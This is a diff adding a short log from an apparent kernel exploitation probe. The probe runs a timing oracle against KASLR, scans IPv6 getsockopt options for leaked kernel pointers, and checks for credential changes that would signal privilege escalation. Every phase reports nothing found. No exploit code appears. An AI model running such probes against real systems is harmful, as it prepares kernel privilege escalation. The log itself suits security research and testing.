@@ -1,0 +1,23 @@
+=== PROBE 145a: KASLR ORACLE + SOCKOPT SCAN ===
+
+pid=561
+
+--- PHASE 1: SYS 624 TIMING ORACLE ---
+mmap delta: avg=5.0 samples=20 first5: 5 5 5 5 5
+Anomalous 624 deltas: 0 / 32
+canary1: true
+
+--- PHASE 2: GETSOCKOPT SCAN ---
+IPv6 socket fd=22
+  opt 46: ret=0 len=20 (no kptr)
+Kernel pointers in sockopt: 0
+canary2: true
+
+--- PHASE 3: CREDENTIAL DIFF ---
+sys587 before: ret=-1
+sys587 after: ret=-1
+Credential diffs: 0
+sys624 VM counter=3520
+
+canary_final: true
+=== PROBE 145a COMPLETE ===
